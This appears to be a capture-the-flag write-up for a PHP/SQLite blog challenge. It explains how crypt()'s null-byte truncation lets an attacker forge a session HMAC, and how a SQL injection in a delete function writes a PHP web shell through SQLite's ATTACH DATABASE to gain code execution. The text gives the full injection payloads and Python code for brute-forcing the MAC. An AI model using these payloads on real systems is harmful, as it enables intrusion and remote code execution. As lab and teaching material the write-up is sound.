Overview
=====

The main logic of the challenges resides in one file, `index.php`.

There is a per-session SQLite database that gets created at
`'/var/www/html/data/' . md5($salt.'|'.$id.'|'.$mac);`. In the session cookie,
there is a user id (`$id`) and a HMAC which will be verified:

```php
    $session = explode('|', $_COOKIE['session']);
    if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
        exit();
    }
    $id = $session[0];
    $mac = $session[1];
```

If we can forge a valid HMAC, we can move forward with a totally controlled `$id` (more on the forgery later).

qxxxb noticed some interesting bits in the nginx config:

``` nginx
location / {
        try_files $uri $uri/ =404;
}
```

We can visit `http://localhost:8888/data/<sandbox_url>/blog.sqlite3` and we'll be
able to read our sqlite database back. But this doesn't help us achive our
ultimate goal: We need to execute `/readflag` (neither nginx nor php have the
ability to read `flag.txt` directly), so we need RCE. The other thing to note
is nginx is setup to send any file ending in `.php` through the php interpreter:

```nginx
location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.4-fpm.sock;
}
```

So if we can write a `.php` file somewhere in `/var/www/html/`, we can just
visit that URL and it will get executed! But how can we create such a file?


Luckily, there's another vulnerability which is likely the first thing you'll notice when scanning `index.php`:

```php
function delete_entry($db, $entry_id, $user_id) {
    $db->exec("DELETE from entry WHERE {$user_id} <> 0 AND id = {$entry_id}");
}
```

SQL injection on `$user_id`! So if we can cram a SQL injection payload into
`$user_id`, we can use any of the capabilities of SQLite.


Exploit
=====

SQL injection to RCE
----

Assuming we can control the user id (requires HMAC forgery, below), how will we
get code execution?

Some [cheat sheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet) I found online shows you can create SQLite databases with arbitrary names:

```
1';ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('hax'); --
```

And nginx is setup to send any file ending in .php through the php interpreter:

```nginx
location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.4-fpm.sock;
}
```

So our SQL injection payload just needs to create a file at `/var/www/html/data/lol-abcdefg.php` containing `<?php system('/readflag;') ?>` anywhere within the file.

So the SQL injection payload we need (with quotes correctly encoded) is:

```
'; ATTACH DATABASE '/var/www/html/data/lol-abcdefg.php' AS lol; CREATE TABLE lol.pwn (dataz test); INSERT INTO lol.pwn (dataz) VALUES ('<?php system(''/readflag'') ?>'); --
```

(the `--` at the end starts a comment)

Forging a HMAC
=====

Here is the relevant code from the `index.php`:

```php
# Generating an HMAC
$mac = substr(crypt(hash_hmac('md5', $id, $secret, true), $salt), 20);

# Verifying an HMAC
if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
    exit();
}
```

The fourth `true` argument to `hash_hmac()` is for the parameter `binary`:
> When set to true, outputs raw binary data. false outputs lowercase hexits.

However, the documentation for `crypt()` shows:
> **Warning**: This function is not (yet) binary safe!

It turns out that `crypt()` considers its inputs as null-terminated strings. As
shown
[here](https://www.reddit.com/r/PHP/comments/t0qzl/is_this_a_bug_shouldnt_crypt_be_binary_safe/),
everything after the null byte is ignored:
```php
>>> assert(
    crypt(b"\x00stuff", '$6$89bc41658a01fb6b$') ==
    crypt(b"\x00ignored", '$6$89bc41658a01fb6b$')
)
=> true
```

The first step is to find a `$mac` where
`hash_hmac('md5', $id, $secret, true)` starts with a null byte.

The probability of this happening for a random `$id` is `1 / 256`. If it
happens twice, we'll get two identical `$mac` values. Here's code to retrieve the null MAC:

```python
def get_null_mac():
    mac_counter = set()
    for i in tqdm(itertools.count()):
        res = requests.get(URL_BASE)
        id, mac = urllib.parse.unquote(res.cookies["session"]).split("|")
        if mac in mac_counter:
            return mac
        mac_counter.add(mac)

    raise ValueError("Unreachable")
```

Now that we have the null MAC, we can append junk at the end of our SQLi
payload inside a comment and until its MAC matches our null MAC (`1 / 256`
chance):

```python
def attempt_sqli(junk: str, null_mac: str):
    payload = (
        "'test'; ATTACH DATABASE '/var/www/html/data/lol-abcdefg.php' AS lol; CREATE TABLE lol.pwn (dataz test); INSERT INTO lol.pwn (dataz) VALUES ('<?php system(''/readflag'') ?>'); -- "
        + junk
    )
    # ...
```
